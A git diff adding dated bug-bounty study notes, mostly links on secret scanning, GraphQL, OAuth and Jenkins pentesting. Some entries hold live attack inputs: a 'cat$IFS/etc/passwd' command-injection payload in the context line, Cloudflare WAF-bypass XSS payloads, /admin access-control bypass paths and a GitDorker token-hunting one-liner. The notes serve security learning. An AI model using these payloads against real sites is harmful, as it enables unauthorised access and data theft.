@@ -187,3 +187,71 @@ cat$IFS/etc/passwd
 # 📅 22-Mar-2021
 ## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 80
 - [DockerENT Framework Insights](https://twitter.com/harshbothra_/status/1373658033943769095?s=20)
+
+# 📅 23-Mar-2021
+- [Detecting Sensitive Data Leaks That Matter](https://blog.shiftleft.io/detecting-sensitive-data-leaks-that-matter-42f7530f5f6d)
+- [Scanning for Secrets in Source Code](https://blog.shiftleft.io/scanning-for-secrets-in-source-code-9fcb486f8c0e)
+- [How To Review Code For Vulnerabilities](https://blog.shiftleft.io/how-to-review-code-for-vulnerabilities-1d017c21a695)
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 81
+- [ImageMagick - Shell injection via PDF password](https://twitter.com/harshbothra_/status/1374020615594647552?s=20)
+
+## Good Resource from [vickieli](https://vickieli.medium.com/)
+- https://vickieli.medium.com
+
+## Cloudflare XSS Bypass via add 8 or more superfluous leading zeros for dec and 7 or more for hex.
+```js
+Dec: <svg onload=prompt%26%230000000040document.domain)>
+Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+```
+
+# 📅 24-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 82
+- [Offensive GraphQL API Pentesting](https://twitter.com/harshbothra_/status/1374390090907090944?s=20)
+
+# 📅 25-Mar-2021
+## [Possible Geolocation Stripped Data Bypass !](https://twitter.com/N008x/status/1374700165978746884?s=20)
+1. /example.com/user/user.jpg?w=xx&h=xx&crop=true > user/user.jpg 
+2. /example.com/user?src=/img/user.jpg > src=/user.jpg
+3. /example.com/img/user.jpg > /example.com/user.jpg
+
+## [If you run a bruteforce and notice weird behaviours - like "/admin/" redirecting to / always investigate these.](https://twitter.com/nnwakelam/status/1374652548817195015?s=20)
+```text
+/admin/
+/admin/../admin
+//admin/
+/Admin/
+/admin;/
+/Admin;/
+/index.php/admin/
+/admin/js/*.js
+/admin/*brute*.ext
+/admin../admin
+//anything/admin/
+```
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 83
+- [Bug Bounties with Bash](https://twitter.com/harshbothra_/status/1374735632514183172?s=20)
+
+## Google Bug Bounty Writeups
+- https://www.ehpus.com/
+
+## OAuth Vulnerabilities
+- https://portswigger.net/web-security/oauth
+- https://portswigger.net/research/hidden-oauth-attack-vectors?s=09
+
+# 📅 26-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 84
+- [Chrome Extensions Code Review](https://twitter.com/harshbothra_/status/1375088298855526400?s=20)
+
+## [Performing recons in package.json. Congratulations](https://twitter.com/ofjaaah/status/1375263280495738883?s=20) to [@alxbrsn](https://twitter.com/alxbrsn)
+- very insane this tactic, now I just have luck to find something.
+```sh
+xargs -a dom -I@ sh -c 'python3 http://GitDorker.py -tf token -q @ -d Dorks/package.json | anew files'
+```
+
+## Graphql Hacking
+- https://twitter.com/drunkrhin0/status/1375038146409271300?s=20
+
+## Jenkins Pen-Testing
+- https://github.com/gquere/pwn_jenkins
